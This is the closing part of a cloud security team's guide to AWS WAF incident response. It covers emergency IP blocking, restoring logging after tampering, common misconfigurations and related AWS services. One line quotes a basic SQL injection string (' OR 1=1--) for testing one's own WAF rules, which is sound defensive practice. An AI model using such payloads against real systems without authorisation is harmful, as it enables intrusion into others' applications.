### When WAF Is Blocking Actively

This is the best-case scenario. WAF is doing its job. Your priorities are:

1. **Contain the source** — add the attacking IP(s) to your WAF IP Set blocklist. Don't wait for the investigation to complete before containment.
2. **Assess the pre-block window** — how long was the attacker hitting the application before WAF started blocking? What did they send during that window?
3. **Check application and database logs** — WAF blocking at the perimeter doesn't mean the application wasn't already compromised by an earlier request in the same session.
4. **Preserve logs** — export the WAF log segment for the attack window. If logs are in S3 with a lifecycle policy, ensure they won't be deleted during the investigation.

**Emergency IP block:**

```bash
# Get the current token for the IP set (required for modifications)
TOKEN=$(aws wafv2 get-ip-set \
  --name "EmergencyBlockList" \
  --scope REGIONAL \
  --id "<ip-set-id>" \
  --region us-east-1 \
  --query 'LockToken' \
  --output text)

# Add the attacker IP (can list multiple, comma-separated)
aws wafv2 update-ip-set \
  --name "EmergencyBlockList" \
  --scope REGIONAL \
  --id "<ip-set-id>" \
  --addresses "198.51.100.42/32" "198.51.100.43/32" \
  --lock-token "$TOKEN" \
  --region us-east-1
```

WAF IP set updates propagate within seconds globally (for CloudFront associations) or within a minute for regional resources.

### When Bypass Is Suspected

A bypass scenario — where the attack appears to have succeeded despite WAF being in place — is more serious. Treat it as a confirmed incident until proven otherwise.

Immediate actions:
- **Do not modify WAF rules yet** — preserve the current state as evidence
- **Check if rules are in COUNT vs BLOCK mode** — this is the #1 cause of apparent bypasses
- **Export all WAF logs for the incident window to a separate, analyst-controlled S3 bucket**
- **Engage application team** — you need application logs, database query logs, and potentially a memory dump of affected instances
- **Check for lateral movement** — if the application server is compromised, the attacker may now be moving through your VPC

If the bypass was through rule evasion (encoded payloads that WAF didn't catch), you have a detection gap. Document it, tune or add rules, and track it as a finding.

### When WAF Configuration Was Tampered

This is a signal of a more sophisticated attacker with IAM access. The attack surface has expanded beyond the web application.

Steps:

1. **Immediately rotate credentials** for the IAM identity that made the changes
2. **Review all CloudTrail activity** from that identity for the past 30 days
3. **Restore WAF configuration from IaC** (Terraform state, CloudFormation stack) — this is the fastest reliable restore
4. **Re-enable logging first**, then restore rules — you need visibility before you can see what's happening
5. **Assume the attacker knew about the WAF logging** — check whether they accessed S3 buckets containing previous WAF logs

**Restore logging (fastest path):**

```bash
aws wafv2 put-logging-configuration \
  --logging-configuration '{
    "ResourceArn": "arn:aws:wafv2:us-east-1:123456789012:regional/webacl/MyWebACL/abc123",
    "LogDestinationConfigs": [
      "arn:aws:firehose:us-east-1:123456789012:deliverystream/aws-waf-logs-production"
    ],
    "RedactedFields": []
  }' \
  --region us-east-1
```

### Scaling Response with AWS Shield

If you're under an active Layer 7 DDoS that's exceeding what WAF rate-based rules can handle alone, AWS Shield Advanced (if subscribed) provides:
- Automatic DDoS rule creation based on traffic baselines
- AWS DDoS Response Team (DRT) engagement during active attacks
- CloudFront and Route 53 integration for attack absorption

Without Shield Advanced, your options are tighter: CloudFront geographic restriction, aggressive rate-based rules, and potentially pulling an instance behind a maintenance page.

---

## 13. Common Mistakes

These are the errors that come up repeatedly — in audits, in post-incident reviews, and in new environment setups. None of them are unique to one team.

---

**Mistake 1: Leaving rules in COUNT mode and never reviewing them**

This is the most common WAF misconfiguration. Teams deploy a new managed rule group in COUNT mode to assess impact, then forget to flip it to BLOCK. The rule is generating telemetry nobody's looking at, and the application is getting no protection from it. Build a monthly review into your process: any rule in COUNT mode for more than 30 days needs a documented reason or needs to be moved to BLOCK.

**Mistake 2: Not enabling logging**

WAF logging is not on by default. An environment can have a fully configured Web ACL with no log output whatsoever, and there's nothing in the AWS console that prominently warns you. Every WAF audit should start with a logging check.

**Mistake 3: Trusting X-Forwarded-For blindly**

`clientIp` in WAF logs reflects the immediate upstream IP — for CloudFront, this is the client. For ALB, it may be correct or it may be a proxy. `X-Forwarded-For` should be treated as advisory, not authoritative. Building detections that rely exclusively on this header for IP attribution will get you burned by trivial spoofing.

**Mistake 4: Assuming WAF covers all your web resources**

WAF Web ACLs need to be explicitly associated with each resource. Having a WAF in one region doesn't cover ALBs in other regions. Spinning up a new ALB doesn't automatically inherit a WAF. Build this check into your infrastructure deployment pipeline — every new ALB and API Gateway should trigger a validation that a WAF is associated.

**Mistake 5: Using WAF as a substitute for application security**

WAF is a compensating control, not a replacement for secure code. Relying on WAF to cover known vulnerabilities in your application is a temporary mitigation, not a fix. The rule used to block Log4Shell at the perimeter was patched in applications within days for most teams — but some treated the WAF block as "problem solved" and never patched the underlying library. WAF buys you time. Use it.

**Mistake 6: Not monitoring the management plane**

Most WAF monitoring focuses on request logs. CloudTrail WAF events are frequently ignored. The management plane is where an attacker with compromised IAM credentials will strike first — disabling logging, removing IP blocklists, switching rules to COUNT mode. If you're not alerting on WAF management plane changes, you have a significant blind spot.

**Mistake 7: One-size-fits-all rate limits**

A rate limit of 2000 requests per 5 minutes may be appropriate for a consumer web application but completely wrong for a high-frequency trading API or a CI/CD health check endpoint. Miscalibrated rate limits generate either constant false positives (alerting fatigue) or never fire in actual attacks. Baseline your endpoint traffic before setting rate thresholds.

**Mistake 8: Not correlating WAF logs with backend logs**

WAF tells you what it blocked. It doesn't tell you what succeeded before the block, or what the backend did with requests that got through. The complete picture requires WAF logs plus ALB access logs plus application logs. Analysts who work only from WAF logs will miss pre-block activity and may incorrectly conclude an attack had no impact.

---

## 14. Related Services

Understanding how WAF fits alongside other AWS security services prevents both gap-creation and redundant coverage.

| Service | Relationship to WAF | When to Use Together |
|---|---|---|
| **AWS Shield Standard** | Auto-enabled, L3/L4 DDoS protection | Always active; no action needed. WAF handles L7 |
| **AWS Shield Advanced** | L7 DDoS protection + DRT engagement | High-value public applications; active DDoS environments |
| **Amazon CloudFront** | CDN that WAF can attach to | Highest-value combination for public web apps; global edge protection |
| **AWS Firewall Manager** | Centralized WAF policy management across accounts | Multi-account orgs; enforces WAF baselines without per-account effort |
| **Amazon GuardDuty** | Threat detection across CloudTrail, VPC Flow, DNS | Correlate GuardDuty malicious IP findings with WAF source IPs |
| **AWS Security Hub** | Aggregates findings from WAF, GuardDuty, Inspector | Cross-service finding correlation; compliance posture |
| **AWS Network Firewall** | L4 stateful inspection inside VPC | Protects internal traffic WAF doesn't see; complements WAF at egress |
| **Amazon Inspector** | Application and container vulnerability scanning | Finds the code-level vulnerabilities WAF is compensating for |
| **Amazon Cognito + ATP** | AWS ATP rule group specifically protects Cognito user pools | Deploy ATP managed rules when Cognito is your auth layer |
| **AWS Config** | Tracks resource configuration changes | Use Config rules to enforce "WAF required on all ALBs" policy |
| **Amazon Athena** | Query WAF logs stored in S3 using standard SQL | Primary tool for WAF log investigation at scale |
| **Amazon OpenSearch / SIEM** | Indexes WAF logs for real-time search and dashboards | Operational monitoring layer on top of raw log storage |

**The stack that actually works:**

For a production environment with serious security requirements, the typical coverage chain looks like this:

```
CloudFront (global edge + WAF)
    → Route 53 (DNS with health checks)
    → WAF on ALB (regional layer 7)
    → Security Groups (L3/L4, instance-level)
    → Network Firewall (VPC-level inspection)
    → Application (instrumented with CloudWatch)
    → GuardDuty (behavioral threat detection)
    → Security Hub (centralized findings)
    → CloudTrail (management plane audit)
```

WAF covers one layer of that stack. It's an important layer, but it's one layer.

---

## 15. Key Takeaways

There are a handful of things from this guide that are worth cementing before you close it.

**WAF logging is not automatic.** Every new environment, every new Web ACL — check that logging is configured and delivering to somewhere you can actually query. This single check would catch the majority of WAF visibility gaps in the wild.

**COUNT mode is a detection layer, not a protection layer.** Rules in COUNT mode are telling you something is happening without stopping it. Treat COUNT hits with the same urgency as BLOCK hits — the difference is that one is blocking the threat and one is silently logging it while the threat continues.

**The most valuable moment in WAF investigation is the pre-block window.** The question is never just "is WAF blocking this?" It's "what happened before WAF started blocking?" That's where impact lives.

**WAF covers the door, not the house.** Once an attacker gets through — via a rule gap, an encoding evasion, a zero-day, or a legitimate session — WAF is no longer relevant. Detection has to continue deeper in the stack: application logs, database audit logs, GuardDuty findings, CloudTrail.

**The management plane is a target.** An attacker with IAM credentials will try to disarm WAF before continuing their operation. Alert on every WAF write operation from non-service principals. This is a 10-minute setup with CloudTrail and SNS, and it will catch a category of attack that most teams miss entirely.

**Tune for your environment.** AWS managed rules are designed to work across millions of different applications. They will generate false positives in your environment. The goal isn't zero false positives — it's a tuned ruleset where every alert is actionable and every gap is documented. That takes iteration. Start with managed rules in COUNT mode, baseline your traffic, flip to BLOCK methodically, and document everything that fires legitimately.

Finally: **test your WAF.** At least quarterly, run a set of known attack payloads against a non-production equivalent of your WAF configuration. If your SQLi rule isn't catching a basic `' OR 1=1--`, you want to find that out in testing, not during an incident. Tools like OWASP ZAP, `awswaf-test`, or even manual curl commands with known SQLi strings will surface gaps you'd otherwise never see until someone exploits them.

---

*Maintained by the Cloud Security team. Submit corrections or additions via pull request.*  
*Related articles: AWS CloudFront Security, AWS API Gateway Threat Modeling, GuardDuty Investigation Guide*  
*Tags: `aws` `waf` `layer7` `appsec` `detection-engineering` `soc` `incident-response` `threat-hunting`*
